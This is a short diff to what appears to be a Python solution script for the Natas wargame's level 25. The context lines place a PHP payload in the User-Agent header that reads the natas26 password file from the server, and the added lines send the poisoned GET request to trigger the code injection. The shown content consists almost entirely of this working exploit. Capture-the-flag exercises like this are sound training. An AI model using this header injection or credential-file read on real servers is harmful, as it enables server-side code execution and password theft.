@@ -104,3 +104,9 @@ print(f'{session.headers}\n')
 # it includes the php code that will display the content of natas26 password file
 # the code will then be executed by the server before returned back to the browser
 session.headers['User-Agent'] = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>"
+
+
+# now, we can carry out the attack
+# firstly, we can use the parameters set previously for the GET request
+# then, we can set the headers of the GET request to the modified session.headers
+response = session.get(URL, params=params, headers=session.headers)
